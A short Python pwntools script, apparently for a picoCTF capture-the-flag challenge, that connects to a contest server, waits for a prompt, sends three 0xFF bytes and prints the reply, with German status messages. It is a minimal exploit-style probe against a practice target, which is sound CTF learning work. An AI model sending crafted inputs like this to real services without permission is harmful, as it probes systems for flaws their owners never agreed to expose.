from pwn import *
import time

host = "lonely-island.picoctf.net"
port = 51759 

print("[+] Verbinde...")
conn = remote(host, port)

print("[+] Warte auf Prompt...")
conn.recvuntil(b"==> ")

print("[+] Sende 0xFF Bytes...")
conn.send(b"\xff\xff\xff\n")

print("[+] Greife die Antwort ab...")
time.sleep(1)

response = conn.clean(timeout=2)

print("\n--- SERVER ANTWORT ---")
print(response.decode(errors='ignore'))
print("----------------------")
